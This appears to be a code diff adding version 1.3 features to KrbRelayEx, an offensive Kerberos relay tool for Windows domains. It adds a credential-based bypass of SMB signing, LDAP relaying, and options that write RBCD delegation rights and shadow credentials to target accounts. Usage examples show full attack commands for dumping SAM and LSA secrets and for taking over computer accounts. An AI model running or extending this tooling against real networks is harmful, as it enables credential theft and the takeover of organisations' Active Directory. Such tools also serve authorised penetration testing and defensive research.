@@ -1,4 +1,4 @@
-﻿using KrbRelay.Clients;
+using KrbRelay.Clients;
 //using KrbRelay.Com;
 using KrbRelay.HiveParser;
 using Microsoft.Win32;
@@ -42,7 +42,7 @@ namespace KrbRelay
     internal class Program
     {
 
-        public const string Version = "V1.2";
+        public const string Version = "V1.3";
         public static string DcomHost = "";
         public static string RedirectHost = "";
         public static string FakeSPN = "";
@@ -60,6 +60,17 @@ namespace KrbRelay
         public static Socket currDestSocket { get; set; }
         //public static bool relayed = false;
         public static bool forwdardmode = false;
+
+        // reauthx-style SMB signing bypass (-reauth DOMAIN/user:password)
+        public static bool reauth = false;
+        public static string reauthDomain = "";
+        public static string reauthUser = "";
+        public static string reauthPassword = "";
+
+        // -ldapdebug: hex dump every LDAP frame sent/received
+        public static bool ldapDebug = false;
+        // -ldapstarttls: upgrade the relay connection to TLS on 389 before binding
+        public static bool ldapStartTls = false;
 
         //public static int numClientConnect = 0;
         public static byte[] apreqBuffer;
@@ -189,6 +200,37 @@ byte[] securityBlob = new byte[securityBufferLength];
             return byteArray;
         }
 
+        /// <summary>
+        /// Parses the -reauth argument: DOMAIN/user:password (the DOMAIN\user:password form is accepted as well).
+        /// The credentials are used to open a base SMB session as a low privileged account, on top of which the
+        /// reflected AP-REQ is re-authenticated (reauthx --reauth-bypass behaviour).
+        /// </summary>
+        public static bool TryParseReauthCredentials(string value)
+        {
+            if (string.IsNullOrWhiteSpace(value))
+                return false;
+
+            int separator = value.IndexOf('/');
+            if (separator < 0)
+                separator = value.IndexOf('\\');
+            if (separator <= 0)
+                return false;
+
+            int colon = value.IndexOf(':', separator + 1);
+            if (colon < 0)
+                return false;
+
+            reauthDomain = value.Substring(0, separator);
+            reauthUser = value.Substring(separator + 1, colon - separator - 1);
+            reauthPassword = value.Substring(colon + 1);
+
+            if (reauthDomain.Length == 0 || reauthUser.Length == 0)
+                return false;
+
+            reauth = true;
+            return true;
+        }
+
         public static SECURITY_HANDLE ldap_phCredential = new SECURITY_HANDLE();
         public static IntPtr ld = IntPtr.Zero;
         public static byte[] ntlm1 = new byte[] { };
@@ -265,11 +307,20 @@ byte[] securityBlob = new byte[securityBufferLength];
                 Console.WriteLine("  -list                          List available SMB shares on the target system");
                 Console.WriteLine("  -bgconsolestartport            Specify the starting port for background SMB console sockets (default: 10000)");
                 Console.WriteLine("  -secrets                       Dump SAM & LSA secrets from the target system");
+                Console.WriteLine("  -reauth <DOMAIN/user:pass>     pre-authenticate with this low privileged account before swapping in the");
+                Console.WriteLine("                                 reflected ticket (CIFS and LDAP only):");
+                Console.WriteLine("                                   CIFS: base SMB session, keeps the account's signing key (reauthx bypass)");
+                Console.WriteLine("                                   LDAP: base simple bind, ticket sent as an RFC 4513 re-authentication");
                 Console.WriteLine();
 
                 Console.WriteLine("HTTP Attacks:");
                 Console.WriteLine("  -endpoint <ENDPOINT>           Specify the HTTP endpoint to target (e.g., 'CertSrv')");
                 Console.WriteLine("  -adcs <TEMPLATE>               Generate a certificate using the specified template");
+                Console.WriteLine();
+                Console.WriteLine("LDAP Attacks:");
+                Console.WriteLine("  -rbcd <COMPUTER>               Set msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer");
+                Console.WriteLine("  -rbcdsid <SID|ACCOUNT>         Principal granted delegation rights in the RBCD descriptor");
+                Console.WriteLine("  -shadowcred <ACCOUNT>          Add a KeyCredential to msDS-KeyCredentialLink of the target account");
                 Console.WriteLine();
 
                 Console.WriteLine("Options:");
@@ -278,6 +329,8 @@ byte[] securityBlob = new byte[securityBufferLength];
                 Console.WriteLine("  -spn <SPN>                     Set the Service Principal Name (SPN) for the target service");
                 Console.WriteLine("  -redirectports <PORTS>         Provide a comma-separated list of additional ports to forward to the target (e.g., '3389,135,5985')");
                 Console.WriteLine("  -smbport <PORT>                Specify the SMB port to listen on (default: 445)");
+                Console.WriteLine("  -ldapstarttls                  Upgrade the LDAP relay connection to TLS on 389 before binding");
+                Console.WriteLine("  -ldapdebug                     Hex dump every LDAP frame sent and received");
                 Console.WriteLine();
 
                 Console.WriteLine("Examples:");
@@ -292,6 +345,17 @@ byte[] securityBlob = new byte[securityBufferLength];
                 Console.WriteLine();
                 Console.WriteLine("  Start a background SMB console on port 10000 upon relay:");
                 Console.WriteLine("    KrbRelay.exe -spn CIFS/target.domain.com -bgconsole -redirecthost <ip_target_host>");
+                Console.WriteLine();
+                Console.WriteLine("  Relay to a target that enforces SMB signing, using the reauthx bypass:");
+                Console.WriteLine("    KrbRelay.exe -spn CIFS/target.domain.com -secrets -redirecthost <ip_target_host> -reauth DOMAIN/user1:Passw0rd!");
+                Console.WriteLine();
+                Console.WriteLine("  Relay a Kerberos ticket to LDAP (389, add -ssl for LDAPS 636):");
+                Console.WriteLine("    KrbRelay.exe -spn LDAP/dc.domain.com -redirecthost <ip_dc>");
+                Console.WriteLine("    KrbRelay.exe -spn LDAP/dc.domain.com -redirecthost <ip_dc> -reauth DOMAIN/user1:Passw0rd!");
+                Console.WriteLine();
+                Console.WriteLine("  After relaying to LDAP, abuse the delegated identity:");
+                Console.WriteLine("    KrbRelay.exe -spn LDAP/dc.domain.com -redirecthost <ip_dc> -shadowcred victim-pc");
+                Console.WriteLine("    KrbRelay.exe -spn LDAP/dc.domain.com -redirecthost <ip_dc> -rbcd victim-pc -rbcdsid attacker-pc");
                 Console.WriteLine();
                 Console.WriteLine("  Generate a certificate using ADCS with a specific template:");
                 Console.WriteLine("    KrbRelay.exe -spn HTTP/target.domain.com -endpoint CertSrv -adcs UserTemplate-redirecthost <ip_target_host>");
@@ -397,6 +461,21 @@ byte[] securityBlob = new byte[securityBufferLength];
                             attacks.Add("console", "");
                         }
                         break;
+
+                    // reauthx-style SMB signing bypass: DOMAIN/user:password of the low privileged account
+                    case "-REAUTH":
+                    case "/REAUTH":
+                        try
+                        {
+                            if (!TryParseReauthCredentials(args[entry.index + 1]))
+                                throw new Exception();
+                        }
+                        catch
+                        {
+                            Console.WriteLine("[-] -reauth requires DOMAIN/user:password (e.g. -reauth AD.LOCAL/user1:Passw0rd!)");
+                            return;
+                        }
+                        break;
                    
                     // smb attacks
                     case "-LIST":
@@ -426,6 +505,43 @@ byte[] securityBlob = new byte[securityBufferLength];
                         {
                             attacks.Add("secrets", "");
                         }
+                        break;
+
+                    // ---- LDAP attacks (managed client, CIFS/HTTP independent) ----
+                    case "-RBCD":
+                    case "/RBCD":
+                        if (entry.index + 1 >= args.Length || args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                        {
+                            Console.WriteLine("[-] -rbcd requires a target computer name");
+                            return;
+                        }
+                        attacks.Add("rbcd", args[entry.index + 1]);
+                        break;
+                    case "-RBCDSID":
+                    case "/RBCDSID":
+                        if (entry.index + 1 >= args.Length || args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                        {
+                            Console.WriteLine("[-] -rbcdsid requires a SID or account name");
+                            return;
+                        }
+                        attacks.Add("rbcdsid", args[entry.index + 1]);
+                        break;
+                    case "-SHADOWCRED":
+                    case "/SHADOWCRED":
+                        if (entry.index + 1 >= args.Length || args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                        {
+                            Console.WriteLine("[-] -shadowcred requires a target account name");
+                            return;
+                        }
+                        attacks.Add("shadowcred", args[entry.index + 1]);
+                        break;
+                    case "-LDAPDEBUG":
+                    case "/LDAPDEBUG":
+                        ldapDebug = true;
+                        break;
+                    case "-LDAPSTARTTLS":
+                    case "/LDAPSTARTTLS":
+                        ldapStartTls = true;
                         break;
 
                     case "-EXEC":
@@ -549,7 +665,7 @@ byte[] securityBlob = new byte[securityBufferLength];
                 targetFQDN = string.Join(".", dd);
 
             }
-            service = spn.Split('/').First();
+            service = spn.Split('/').First().ToLower();
             if (!string.IsNullOrEmpty(domain))
             {
                 var domainComponent = domain.Split('.');
@@ -558,6 +674,24 @@ byte[] securityBlob = new byte[securityBufferLength];
                     domainDN += string.Concat(",DC=", dc);
                 }
                 domainDN = domainDN.TrimStart(',');
+            }
+
+            if (reauth && service != "cifs" && service != "ldap")
+            {
+                Console.WriteLine("[-] -reauth is only supported for CIFS and LDAP relays");
+                return;
+            }
+
+            if ((attacks.ContainsKey("rbcd") || attacks.ContainsKey("shadowcred")) && service != "ldap")
+            {
+                Console.WriteLine("[-] -rbcd and -shadowcred are only supported for LDAP relays: use -spn LDAP/<dc>");
+                return;
+            }
+
+            if (attacks.ContainsKey("rbcd") && !attacks.ContainsKey("rbcdsid"))
+            {
+                Console.WriteLine("[-] -rbcd requires -rbcdsid <SID|account> (the principal granted delegation rights)");
+                return;
             }
 
             //
@@ -618,6 +752,11 @@ byte[] securityBlob = new byte[securityBufferLength];
 
           
             Console.WriteLine("[*] KrbRelayEx started");
+            if (reauth)
+            {
+                Console.WriteLine("[*] reauth enabled: base {0} session as {1}\\{2} before re-authenticating the reflected ticket",
+                    service == "ldap" ? "LDAP" : "SMB", reauthDomain, reauthUser);
+            }
 
 
             ShowCommands();
